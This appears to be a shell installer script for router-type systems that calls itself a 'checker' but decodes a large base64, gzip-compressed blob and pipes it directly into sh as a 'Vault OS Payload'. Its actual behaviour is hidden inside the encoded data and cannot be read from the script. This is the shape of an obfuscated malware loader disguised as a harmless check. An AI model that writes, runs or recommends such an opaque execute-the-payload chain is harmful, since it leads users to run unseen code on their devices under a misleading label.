#!/bin/sh
echo "====================================================="
echo "  FIRST STEP - CHECKER MODE - ACTIVATING...."
echo "====================================================="

if ! command -v base64 >/dev/null 2>&1; then
    echo "📦 Preping dependencies..."
    
    if command -v opkg >/dev/null 2>&1; then
        opkg update >/dev/null 2>&1
        opkg install coreutils-base64 >/dev/null 2>&1
    elif command -v apk >/dev/null 2>&1; then
        apk update >/dev/null 2>&1
        apk add coreutils >/dev/null 2>&1 
    else
        echo "❌ ERROR: No package manager found! Cannot install base64."
        exit 1
    fi
    
    if ! command -v base64 >/dev/null 2>&1; then
         echo "❌ ERROR: Base64 installation failed. Aborting."
         exit 1
    fi
fi

PAYLOAD="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"

echo "🚀 Executing Vault OS Payload..."
echo "$PAYLOAD" | base64 -d | gunzip | sh

exit 0
